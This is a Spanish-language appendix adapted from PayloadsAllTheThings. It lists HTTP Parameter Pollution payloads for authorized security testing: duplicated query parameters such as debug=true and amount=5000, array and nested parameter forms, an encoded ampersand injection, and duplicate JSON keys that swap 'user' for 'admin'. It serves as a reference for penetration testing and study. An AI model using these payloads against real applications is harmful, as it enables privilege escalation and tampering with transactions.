# HTTP Parameter Pollution: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [HTTP Parameter Pollution/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/HTTP%20Parameter%20Pollution/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. HTTP Parámetro Pollution / Metodología

```ps1
/app?debug=false&debug=true
/transfer?amount=1&amount=5000
```

## 2. Metodología / Parámetro Pollution Tabla

### Variantes presentes en tablas o texto del apartado

```text
r.URL.Query().Get("param")
r.URL.Query()["param"]
```

## 3. Metodología / Parámetro Pollution Payloads

```ps1
    param=value1&param=value2
```

```ps1
    param[]=value1
    param[]=value1&param[]=value2
    param[]=value1&param=value2
    param=value1&param[]=value2
```

```ps1
    param=value1%26other=value2
```

```ps1
    param[key1]=value1&param[key2]=value2
```

```ps1
    {
        "test": "user",
        "test": "admin"
    }
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
